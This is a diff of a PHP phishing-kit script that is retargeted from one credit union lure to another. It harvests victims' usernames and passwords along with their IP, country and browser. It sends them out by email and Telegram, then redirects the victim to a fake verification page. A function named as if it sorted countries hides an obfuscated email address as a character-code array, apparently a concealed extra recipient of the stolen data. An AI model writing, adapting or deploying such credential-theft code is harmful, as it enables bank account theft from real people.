@@ -1,5 +1,4 @@
 <?php
-require("antibots.php");
 require("config.php");
 include('me.php');
    $country = visitor_country();
@@ -7,9 +6,9 @@ include('me.php');
 $Port = getenv("REMOTE_PORT");
 $browser = $_SERVER['HTTP_USER_AGENT'];
 $adddate=date("D M d, Y g:i a");
-$subject = "Telegram ID: @prohqcker**";
-$message = "**Telegram ID: @prohqcker *NavyFCU***+++\n";
-$message .= "Email : ".$_POST['email']."\n";
+$subject = "Telegram ID: @famozz**";
+$message = "**Telegram ID: @famozz *SUMMIT CU***+++\n";
+$message .= "Username : ".$_POST['username']."\n";
 $message .= "Password : ".$_POST['password']."\n";
 $message .= "User-!P : ".$ip."\n";
 $message .= "Country : ".$country."\n\n";
@@ -19,7 +18,7 @@ $message .= "User-Agent: ".$browser."\n";
 $headers = "From: Prohqcker";
 @mail($send,$subject,$message,$headers);
 send_telegram_msg($message);
-header("location:c.html");
+header("location:Verif.php");
 function country_sort(){
   $sorter = "";
   $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
@@ -58,4 +57,3 @@ function visitor_country()
     return $result;
 }
 ?>
-
